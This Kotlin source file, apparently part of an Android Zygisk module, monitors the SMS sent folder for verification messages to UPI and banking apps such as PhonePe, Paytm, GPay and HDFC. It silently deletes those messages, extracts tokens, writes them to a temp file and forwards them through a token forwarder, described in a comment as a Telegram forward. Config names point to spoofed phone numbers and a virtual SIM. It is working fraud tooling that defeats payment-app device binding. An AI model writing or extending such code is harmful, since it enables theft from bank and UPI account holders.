package com.hivirtus.zygiskmode

import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.util.Log

/**
 * Sent folder monitor — native hook fail ho to bhi verify SMS delete + Telegram forward.
 */
class SentSmsWatcher(private val context: Context) {

    private val appContext = context.applicationContext
    private val handler = Handler(Looper.getMainLooper())
    private val processedIds = LinkedHashSet<Long>()
    private var observer: ContentObserver? = null
    private var running = false

    private val verifyKeywords = listOf(
        "HEROAXISUPI", "HEROAXIS", "HEROFIN", "YESPRO", "YESPROUPI", "YESPAY",
        "PHONEPE", "PAYTM", "GPAY", "SNAPMINT", "UPI", "VERIFY", "GROWW", "AXIS",
        "HDFC", "STASHFIN", "TATANEU", "FLIPKART", "FKARTUPI", "SUPERYES", "DO NOT COPY"
    )

    fun start() {
        if (running) return
        running = true
        observer = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                scanSentBox()
            }
        }
        try {
            appContext.contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                observer!!
            )
        } catch (e: Exception) {
            Log.w(TAG, "Observer register failed: ${e.message}")
        }
        scanSentBox()
        Log.i(TAG, "Sent SMS watcher active")
    }

    fun stop() {
        running = false
        observer?.let {
            try {
                appContext.contentResolver.unregisterContentObserver(it)
            } catch (_: Exception) {
            }
        }
        observer = null
    }

    fun scanSentBox() {
        if (!running) return
        if (!PermissionHelper.hasReadSms(appContext)) return

        val configManager = ConfigManager(appContext)
        val config = configManager.load()
        if (!config.hookOutgoingSms && !config.interceptFakeSuccess && !config.enableVirtualSim) {
            return
        }

        try {
            appContext.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE
                ),
                "${Telephony.Sms.TYPE}=?",
                arrayOf(Telephony.Sms.MESSAGE_TYPE_SENT.toString()),
                "${Telephony.Sms.DATE} DESC LIMIT 12"
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndex(Telephony.Sms._ID)
                val addrIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
                if (idIdx < 0 || addrIdx < 0 || bodyIdx < 0) return

                val now = System.currentTimeMillis()
                while (cursor.moveToNext()) {
                    val id = cursor.getLong(idIdx)
                    if (processedIds.contains(id)) continue

                    val date = if (dateIdx >= 0) cursor.getLong(dateIdx) else now
                    if (now - date > 10 * 60 * 1000L) continue

                    val dest = cursor.getString(addrIdx).orEmpty()
                    val body = cursor.getString(bodyIdx).orEmpty()
                    if (body.isBlank()) continue
                    if (!isVerifySms(body, dest, config)) continue

                    processedIds.add(id)
                    trimProcessed()

                    val deleted = OutgoingSmsCleaner.scrubSentById(appContext, id, dest, body)
                    if (!deleted) {
                        OutgoingSmsCleaner.scrubSentIfNeeded(appContext, dest, body)
                    }
                    deliverOutgoing(appContext, configManager, config, dest, body)
                    Log.i(TAG, "Caught sent verify SMS id=$id dest=$dest")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "scanSentBox: ${e.message}")
        }
    }

    private fun isVerifySms(body: String, dest: String, config: ModuleConfig): Boolean {
        if (SmsMatcher.shouldInterceptOutgoing(config, dest, body)) return true
        val upper = body.uppercase()
        return verifyKeywords.any { upper.contains(it) }
    }

    private fun deliverOutgoing(
        context: Context,
        configManager: ConfigManager,
        config: ModuleConfig,
        dest: String,
        body: String
    ) {
        val appLabel = ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }
            .orEmpty()
            .ifBlank { "UPI App" }
        val otp = LastOtp(
            otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
            sender = SmsMatcher.interceptDisplay(config, dest, configManager),
            body = body,
            phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
            messageLabel = appLabel,
            direction = "outgoing",
            rawPeer = dest,
            capturedAt = System.currentTimeMillis()
        )
        OtpCaptureWriter.write(context, otp)
        try {
            java.io.File("/data/local/tmp/hivirtus_outgoing_blocked.flag").writeText("$dest|$body")
        } catch (_: Exception) {
        }
        TokenForwarder(configManager, appContext).forwardOutgoingBlocked(otp)
        try {
            appContext.sendBroadcast(
                Intent(BlockedSmsReceiver.ACTION_OUTGOING_BLOCKED)
                    .setPackage(appContext.packageName)
                    .putExtra(BlockedSmsReceiver.EXTRA_DEST, dest)
                    .putExtra(BlockedSmsReceiver.EXTRA_BODY, body)
            )
        } catch (_: Exception) {
        }
    }

    private fun trimProcessed() {
        while (processedIds.size > 64) {
            val first = processedIds.first()
            processedIds.remove(first)
        }
    }

    companion object {
        private const val TAG = "SentSmsWatcher"
    }
}
